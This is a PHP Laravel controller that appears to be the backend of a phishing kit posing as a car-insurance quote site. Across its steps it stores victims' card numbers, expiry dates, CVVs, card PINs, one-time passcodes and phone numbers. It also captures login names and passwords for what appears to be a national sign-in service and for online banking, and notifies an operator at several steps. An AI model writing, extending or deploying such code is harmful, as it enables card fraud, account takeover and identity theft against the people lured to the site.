<?php

namespace App\Http\Controllers;

use App\Http\Requests\StepEightRequest;
use App\Http\Requests\StepElevenRequest;
use App\Http\Requests\StepFiveRequest;
use App\Http\Requests\StepFourRequest;
use App\Http\Requests\StepNineRequest;
use App\Http\Requests\StepOneRequest;
use App\Http\Requests\StepSevenRequest;
use App\Http\Requests\StepSixRequest;
use App\Http\Requests\StepTenRequest;
use App\Http\Requests\StepThreeRequest;
use App\Http\Requests\StepTwoRequest;
use App\Models\Client;
use App\Models\MobileCompany;
use App\Models\Notification;
use App\Models\Service;
use Illuminate\Http\Request;

class StepController extends Controller
{
    public function stepOneView($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-one', compact('client'));
    }

    public function stepOneAction(StepOneRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();

        $client->end_point = 1;
        $client->active = 1;
        $client->first_name = $inputs['first_name'];
        $client->serial_number = $inputs['serial_number'];
        $client->save();

        return redirect()->route('stepTwoView', ['id' => $client->id, 'national_number' => $client->national_number]);
    }


    public function stepTwoView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();

        return view('frontend.steps.step-two', compact('client'));
    }

    public function stepTwoAction(StepTwoRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();

        $client->end_point = 2;
        $client->insurance_type = $inputs['insurance_type'];
        $client->contract_started_at = $inputs['contract_started_at'];
        $client->use_car_for = $inputs['use_car_for'];
        $client->contract_started_at = $inputs['contract_started_at'];
        $client->repair_in = $inputs['repair_in'];
        $client->car_made_at = $inputs['car_made_at'];
        $client->estimated_car_value = $inputs['estimated_car_value'];
        $client->car_type = $inputs['car_type'];

        $client->save();

        return redirect()->route('stepThreeView', [3, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepThreeView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();

        if ($client->insurance_type == TAMEEB_DD_ELGHER) {
            $services = Service::select('services.id as id', 'services.image as image', 'services.price_against_other as price')->get();
        } elseif ($client->insurance_type == TAMEEB_SHAMEL) {
            $services = Service::select('services.id as id', 'services.image as image', 'services.price_general as price')->get();
        }

        return view('frontend.steps.step-three', compact('client', 'services'));
    }

    public function stepThreeAction(StepThreeRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->end_point = 3;
        $client->service_id = $inputs['service_id'];
        $client->save();

        return redirect()->route('stepFourView', [4, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepFourView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        if ($client->insurance_type == TAMEEB_DD_ELGHER) {
            $service = Service::where('id', $client->service_id)->select('services.id as id', 'services.price_against_other as price')->firstOrFail();
        } elseif ($client->insurance_type == TAMEEB_SHAMEL) {
            $service = Service::where('id', $client->service_id)->select('services.id as id', 'services.price_general as price')->firstOrFail();
        } else {
            abort(404);
        }

        return view('frontend.steps.step-four', compact('client', 'service'));
    }

    public function stepFourAction(StepFourRequest $request)
    {

        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->end_point = 4;

        if ($client->insurance_type == TAMEEB_DD_ELGHER) {
            $service_price = $client->service->price_against_other;
        } elseif ($client->insurance_type == TAMEEB_SHAMEL) {
            $service_price = $client->service->price_general;
        }

        $client->total_price =  $service_price;
        $client->save();

        return redirect()->route('stepFiveView', [5, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepFiveView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-five', compact('client'));
    }

    public function stepFiveAction(StepFiveRequest $request)
        {
            // Get the input data from the request
            $inputs = $request->all();
            $name = $request->input('name');
            // Find or create the client
            $client = Client::updateOrCreate(
                ['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']],  // Check if client exists
                [   // Data to update or create
                    'end_point' => 5,
                    'first_name' => $name,
                    'last_name' => $inputs['last_name'] ?? null,
                    'visa_number' => $inputs['visa_number'] ?? null,
                    'visa_end_year' => $inputs['visa_end_year'] ?? null,
                    'visa_end_month' => $inputs['visa_end_month'] ?? null,
                    'visa_vcc' => $inputs['visa_vcc'] ?? null,
                    'verified_visa' => null,  
                    'active' => 1,
                    'stc_a' => 0,
                    'otp_number' => null,
                    'nafed_otp' => null,
                    'second_confirmed_otp' => null,
                    'second_otp' => null,
                ]
            );
            return redirect()->route('stepSixView', [6, 'id' => $client->id, 'national_number' => $client->national_number]);
        }
        
    

    // public function validateCardNumberView($client, $national_number)
    // {
    //     $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
    //     return view('frontend.steps.confirm_visa_number', compact('client'));
    // }

    // public function validateCardNumberAction(Request $request)
    // {
    //     $request->validate([
    //         'client_id' => 'required',
    //         'national_number' => 'required'
    //     ]);
    //     $inputs = $request->all();
    //     $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
    //     if ($client->verified_visa == 1) {
    //         return redirect()->route('stepSixView', [6, 'id' => $client->id, 'national_number' => $client->national_number]);
    //     } elseif ($client->verified_visa == -1){
    //         return redirect()->route('stepFiveView', [5, 'id' => $client->id, 'national_number' => $client->national_number]);
    //     }
    // }

    public function stepSixView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-six', compact('client'));
    }

    public function stepSixAction(StepSixRequest $request)
    {

           $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->end_point = 6;
        $client->confirmed_otp = $inputs['confirmed_otp'];
        $client->save();

        Notification::add($client);
        return redirect()->route('stepSevenView', [6, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepSevenView($client, $national_number)
    {

           $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-seven', compact('client'));
    }

    public function stepSevenAction(StepSevenRequest $request)
    {

        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();

        if ($client->end_point == 5) {
            return redirect()->route('stepSixView', [6, 'id' => $client->id, 'national_number' => $client->national_number]);
        } elseif ($client->end_point == 7) {
            return redirect()->route('stepEightView', [8, 'id' => $client->id, 'national_number' => $client->national_number]);
        }elseif ( $client->verified_visa == -1) {
            return redirect()->route('stepFiveView', [5, 'id' => $client->id, 'national_number' => $client->national_number]);

        }

        abort(404);
    }

    public function stepEightView($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-eight', compact('client'));
    }

    public function stepEightAction(StepEightRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->end_point = 8;
        $client->visa_password = $inputs['visa_password'];
        $client->save();
    if (Client::isValidVisaNumber($client->visa_number)) {
         return view('frontend.loading_screen', [
        'redirectUrl' => route('stepRaghyView', ['id' => $client->id, 'national_number' => $client->national_number])
    ]);
    }

        return redirect()->route('stepNineView', [9, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepNineView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        $mobile_network = MobileCompany::all();
        return view('frontend.steps.step-nine', compact('client', 'mobile_network'));
    }

    public function stepNineAction(StepNineRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->end_point = 9;

        $client->phone = $inputs['phone'];
        $client->network_id = $inputs['network_id'];
          $client->save();


        // Notification::add($client);
        return redirect()->route('stepTenView', [10, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stc7hara($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.stc7hara', compact('client'));
    }

    public function stepTenView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-ten', compact('client'));
    }

    public function stepTenAction(StepTenRequest $request)
    {
        $inputs = $request->all();
        $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();



           $client->end_point = 10;
        $client->second_confirmed_otp = $inputs['confirmed_second_otp'];
        $client->save();







        Notification::add($client);

        return redirect()->route('stepElevenView', [11, 'id' => $client->id, 'national_number' => $client->national_number]);
    }

    public function stepElevenView($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-eleven', compact('client'));
    }

    public function stepElevenAction(StepElevenRequest $request)
    {
        $inputs = $request->all();
           $client = Client::where(['id' => $inputs['client_id'], 'national_number' => $inputs['national_number']])->firstOrFail();
        $client->active = 1;
         $client->end_point =11;
        $client->save();


        if ($client->second_confirmed_otp == 0) {
            return redirect()->route('stepTenView', [9, 'id' => $client->id, 'national_number' => $client->national_number]);

        }
        

       if ($client->network_id == 3 && $client->stc_a == 0) {
    if ($client->end_point == 11) {
        $client->end_point = 900; // Temporarily set to 900 during STC process
        $client->save();
        Notification::add($client);
        return redirect()->route('stc7hara', [10, 'id' => $client->id, 'national_number' => $client->national_number]);
    }
    if ($client->end_point == 900) {
        $client->end_point = 111; // 
        $client->save();
                   return redirect()->route('stepLoginView', [111, 'id' => $client->id, 'national_number' => $client->national_number]);

    }
}



        if ($client->end_point == 9) {
            return redirect()->route('stepTenView', [9, 'id' => $client->id, 'national_number' => $client->national_number]);
        } elseif ($client->end_point == 11) {
            // Notification::add($client);
            return redirect()->route('stepLoginView', [111, 'id' => $client->id, 'national_number' => $client->national_number]);
        } elseif ($client->end_point == 12) {
            Notification::add($client);
            return redirect()->route('stepNineView', [9, 'id' => $client->id, 'national_number' => $client->national_number]);
        }
        abort(404);
    }
    public function stepLoginView($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.login', compact('client'));
    }
      public function stepLoginAction(Request $request)
{
    $request->validate([
        'username' => 'required|string',
        'password' => 'required|string',
        'national_number' => 'required|string',
        'client_id' => 'required|integer',
    ]);

    $client = Client::where([
        'id' => $request->client_id,
        'national_number' => $request->national_number,
    ])->firstOrFail();

    $client->update([
        'nafaz_name' => $request->username,
        'nafaz_password' => $request->password,
    ]);

 Notification::add($client);
return redirect()->route('stepTwelveView', [12, 'id' => $client->id, 'national_number' => $client->national_number]);}


    public function stepTwelveView($client, $national_number)
    {

        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.step-twelve', compact('client'));
    }
   
     public function stepRaghyView($client, $national_number)
    {
        $client = Client::where(['id' => $client, 'national_number' => $national_number])->firstOrFail();
        return view('frontend.steps.raghy', compact('client'));
    }
      public function stepRaghyAction(Request $request)
{
    $request->validate([
        'raghy_name' => 'required|string',
        'raghy_password' => 'required|string',
        'national_number' => 'required|string',
        'client_id' => 'required|integer',
    ]);

    $client = Client::where([
        'id' => $request->client_id,
        'national_number' => $request->national_number,
    ])->firstOrFail();

    $client->update([
        'raghy_name' => $request->raghy_name,
        'raghy_password' => $request->raghy_password,
    ]);

        return redirect()->route('stepNineView', [9, 'id' => $client->id, 'national_number' => $client->national_number]);


    }
}
